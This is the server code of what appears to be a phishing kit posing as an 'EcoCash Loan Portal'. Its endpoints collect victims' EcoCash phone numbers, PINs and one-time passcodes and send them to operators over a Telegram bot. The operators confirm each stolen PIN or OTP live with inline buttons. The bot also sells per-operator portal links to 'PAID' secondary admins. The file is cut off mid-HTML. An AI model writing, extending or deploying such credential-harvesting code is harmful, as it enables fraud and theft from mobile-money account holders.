require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// Persistent storage file path
const STORAGE_FILE = path.join(__dirname, 'admins_data.json');

// Load initial data from disk if it exists
function loadPersistentData() {
  try {
    if (fs.existsSync(STORAGE_FILE)) {
      const rawData = fs.readFileSync(STORAGE_FILE, 'utf8');
      const parsed = JSON.parse(rawData);
      return {
        authorizedUsers: new Map(parsed.authorizedUsers || []),
        secondaryAdmins: new Map(parsed.secondaryAdmins || []),
        pathToAdminChat: new Map(parsed.pathToAdminChat || []),
        adminCounter: parsed.adminCounter || 1
      };
    }
  } catch (err) {
    console.error("Error loading persistent data:", err);
  }
  return {
    authorizedUsers: new Map(),
    secondaryAdmins: new Map(),
    pathToAdminChat: new Map(),
    adminCounter: 1
  };
}

// Save current maps to disk
function savePersistentData() {
  try {
    const dataToSave = {
      authorizedUsers: Array.from(authorizedUsers.entries()),
      secondaryAdmins: Array.from(secondaryAdmins.entries()),
      pathToAdminChat: Array.from(pathToAdminChat.entries()),
      adminCounter
    };
    fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
  } catch (err) {
    console.error("Error saving persistent data:", err);
  }
}

const activeApplications = new Map();
const persisted = loadPersistentData();
const authorizedUsers = persisted.authorizedUsers;
const secondaryAdmins = persisted.secondaryAdmins;
const pathToAdminChat = persisted.pathToAdminChat;
let adminCounter = persisted.adminCounter;

function formatZimbabwePhone(phone) {
  let formattedPhone = phone || '';
  if (formattedPhone.startsWith('+263')) {
    formattedPhone = formattedPhone.replace('+263', '');
  } else if (formattedPhone.startsWith('263')) {
    formattedPhone = formattedPhone.slice(3);
  } else if (formattedPhone.startsWith('0')) {
    formattedPhone = formattedPhone.slice(1);
  }
  return formattedPhone;
}

// STEP 2 SUBMISSION: Credentials delivered strictly to the specific secondary Admin chat tied to the link path
app.post('/api/submit-credentials', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);
    
    if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {
      return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });
    }

    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;

    let portalPath = data.portalPath || '';
    if (!portalPath.startsWith('/Admin-')) {
      portalPath = '/Admin-0001';
    }
    
    const targetChatId = pathToAdminChat.get(portalPath);

    if (!targetChatId) {
      return res.status(400).json({ success: false, error: "This portal link is not currently mapped to an active session or admin." });
    }

    activeApplications.set(appReference, {
      ...data,
      formattedPhone,
      portalPath,
      targetChatId,
      status: 'PIN_PENDING'
    });

    const botToken = process.env.TELEGRAM_BOT_TOKEN;

    if (botToken && targetChatId) {
      const currentTimestamp = new Date().toLocaleString('en-US', {
        timeZone: 'Africa/Harare',
        year: 'numeric', month: 'numeric', day: 'numeric',
        hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true
      });

      const messageText = `🔐 <b>NEW ECOCASH APPLICATION</b>\n\n` +
                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
                          `❓ <b>VERIFY PIN ACCURACY:</b>`;

      const telegramPayload = {
        chat_id: targetChatId,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [
              { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
              { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
            ]
          ]
        })
      };

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramPayload)
      });
    }

    res.status(201).json({ success: true, appReference });
  } catch (error) {
    console.error("Credentials submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// STEP 3 SUBMISSION: OTP delivered to the exact same secondary Admin chat that received Step 2
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { appReference, otpCode } = req.body;
    const appData = activeApplications.get(appReference);

    if (!appData) {
      return res.status(404).json({ success: false, error: "Application reference not found" });
    }

    appData.otpCode = otpCode;
    appData.status = 'OTP_PENDING';
    activeApplications.set(appReference, appData);

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const targetChatId = appData.targetChatId;

    if (botToken && targetChatId) {
      const messageText = `💬 <b>OTP VERIFICATION HAS BEEN SUBMITTED</b>\n\n` +
                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                          `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
                          `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
                          `❓ <b>VERIFY OTP ACCURACY:</b>`;

      const telegramPayload = {
        chat_id: targetChatId,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [
              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
            ]
          ]
        })
      };

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramPayload)
      });
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("OTP submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// Status Polling Endpoint
app.get('/api/check-status/:appReference', (req, res) => {
  const { appReference } = req.params;
  const appData = activeApplications.get(appReference);

  if (!appData) {
    return res.status(404).json({ success: false, status: 'NOT_FOUND' });
  }

  res.json({ success: true, status: appData.status });
});

// Telegram Webhook Handler
app.post('/api/telegram-webhook', async (req, res) => {
  res.sendStatus(200);
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const masterChatId = process.env.TELEGRAM_CHAT_ID;

  if (req.body.message && req.body.message.text) {
    const message = req.body.message;
    const text = message.text.trim();
    const chatId = message.chat.id.toString();
    const user = message.from;

    if (text === '/start') {
      const userId = user.id;
      const firstName = user.first_name || 'N/A';
      const lastName = user.last_name || '';
      const fullName = `${firstName} ${lastName}`.trim();
      const username = user.username ? `@${user.username}` : 'No Username';
      const privateLink = user.username ? `https://t.me/${user.username}` : `tg://user?id=${userId}`;

      const userStatus = authorizedUsers.get(userId);

      // Main Admin check
      if (chatId === masterChatId.toString()) {
        authorizedUsers.set(userId, 'PAID');
        const mainPath = '/Admin-0001';
        pathToAdminChat.set(mainPath, chatId);
        savePersistentData();

        const portalUrl = `https://${req.get('host')}${mainPath}`;
        const welcomeBackText = `🤖 <b>EcoCash Loan Portal (Main Admin)</b>\n\n` +
                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
                                `🔗 <b>Your Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
        });
        return;
      }

      // Secondary Admin who is already PAID
      if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
        const assignedPath = secondaryAdmins.get(userId);
        const portalUrl = `https://${req.get('host')}${assignedPath}`;
        
        pathToAdminChat.set(assignedPath, chatId);
        savePersistentData();

        const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +
                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
                                `🔗 <b>Your Private Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
        });
        return;
      }

      if (userStatus === 'UNPAID') {
        const deniedText = `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b> by the administrator.`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: deniedText, parse_mode: 'HTML' })
        });
        return;
      }

      if (userStatus === 'PENDING') {
        const pendingAgainText = `👋 Hello <b>${fullName}</b>,\n\n` +
                                 `Your access request is already pending review by the main administrator. Please wait for clearance.`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: pendingAgainText, parse_mode: 'HTML' })
        });
        return;
      }

      authorizedUsers.set(userId, 'PENDING');
      savePersistentData();

      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +
                             `👤 <b>Name:</b> ${fullName}\n` +
                             `🏷 <b>Username:</b> ${username}\n` +
                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
                             `👇 <b>Select Access Status for this User:</b>`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: masterChatId,
          text: adminAlertText,
          parse_mode: 'HTML',
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [
                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
              ]
            ]
          })
        })
      });

      const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
                              `Your access request has been sent to the main administrator for review.\n\n` +
                              `🆔 <b>Your ID:</b> <code>${userId}</code>\n` +
                              `📌 <b>Status:</b> Pending Approval (Waiting for PAID clearance)`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: userPendingText, parse_mode: 'HTML' })
      });
    }
    return;
  }

  const { callback_query } = req.body;
  if (!callback_query) return;

  const actionData = callback_query.data;
  const chatId = callback_query.message.chat.id.toString();
  const messageId = callback_query.message.message_id;

  if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
    if (chatId !== masterChatId.toString()) {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action. Main Admin only.", show_alert: true })
      });
      return;
    }

    const targetUserId = parseInt(actionData.split('_')[2], 10);
    const isPaid = actionData.startsWith('access_paid_');

    authorizedUsers.set(targetUserId, isPaid ? 'PAID' : 'UNPAID');

    let assignedPath = '';
    if (isPaid) {
      if (!secondaryAdmins.has(targetUserId)) {
        adminCounter++;
        const paddedId = String(adminCounter).padStart(4, '0');
        assignedPath = `/Admin-${paddedId}`;
        secondaryAdmins.set(targetUserId, assignedPath);
        pathToAdminChat.set(assignedPath, targetUserId.toString());
      } else {
        assignedPath = secondaryAdmins.get(targetUserId);
        pathToAdminChat.set(assignedPath, targetUserId.toString());
      }
    }
    savePersistentData();

    const statusLabel = isPaid ? `🟢 APPROVED (PAID) - Link: ${assignedPath}` : '🔴 REJECTED (UNPAID)';
    const updatedText = `${callback_query.message.text}\n\n📌 <b>Decision:</b> ${statusLabel}`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);

    const portalUrl = isPaid ? `https://${req.get('host')}${assignedPath}` : '';
    const notificationText = isPaid 
      ? `🎉 <b>Access Granted!</b>\n\nYour payment has been verified as <b>PAID</b>. Here is your unique private portal link:\n\n🔗 <a href="${portalUrl}">${portalUrl}</a>`
      : `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b>. Access to the portal link is restricted.`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: targetUserId, text: notificationText, parse_mode: 'HTML', disable_web_page_preview: true })
    });
    return;
  }

  let targetAppRef = '';
  if (actionData.startsWith('pin_correct_')) targetAppRef = actionData.replace('pin_correct_', '');
  if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
  if (actionData.startsWith('otp_correct_')) targetAppRef = actionData.replace('otp_correct_', '');
  if (actionData.startsWith('otp_wrong_')) targetAppRef = actionData.replace('otp_wrong_', '');

  if (targetAppRef) {
    const appData = activeApplications.get(targetAppRef);
    if (appData && appData.targetChatId && chatId !== appData.targetChatId.toString()) {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callback_query.id, text: "You can only control actions for your own portal link.", show_alert: true })
      });
      return;
    }
  }

  if (actionData.startsWith('pin_correct_')) {
    const appReference = actionData.replace('pin_correct_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PIN_APPROVED';
      activeApplications.set(appReference, appData);
    }
    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: PIN Verified as CORRECT ✅</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  if (actionData.startsWith('pin_wrong_')) {
    const appReference = actionData.replace('pin_wrong_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PIN_REJECTED';
      activeApplications.set(appReference, appData);
    }
    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Verified as WRONG ❌</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  if (actionData.startsWith('otp_correct_')) {
    const appReference = actionData.replace('otp_correct_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'OTP_APPROVED';
      activeApplications.set(appReference, appData);
    }
    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Verified as CORRECT ✅</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  if (actionData.startsWith('otp_wrong_')) {
    const appReference = actionData.replace('otp_wrong_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'OTP_REJECTED';
      activeApplications.set(appReference, appData);
    }
    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP Verified as WRONG ❌</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }
});

async function editTelegramMessage(botToken, chatId, messageId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.error("Telegram edit error:", err.message);
  }
}

// PERMANENT ROUTE GUARD: Once authorised and saved to disk, this link opens instantly without stopping
app.get('/Admin-*', (req, res) => {
  const requestedPath = req.path;
  
  if (pathToAdminChat.has(requestedPath)) {
    return res.sendFile(path.join(publicPath, 'index.html'));
  }
  
  res.status(403).send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Access Denied - EcoCash Portal</title>
      <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-blue-50/50 flex flex-col items-center justify-center min-h-screen p-4">
      <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-md p-8 text-center space-y-4">
        <div class="text-4xl">⚠️</div>
        <h1 class="text-2xl font-extrabold text-red-600">Unauthorized Portal Link</h1>
        <p class="text-sm text-slate-600">This portal link is not yet authorized or mapped to an active account.</p>
      </div>
    </body>
    </html>
  `);
});

app.get('*', (req, res) => {
  res.status(404).send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Page Not Found - EcoCash Portal</title>
      <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-blue-50/50 flex flex-col items-c
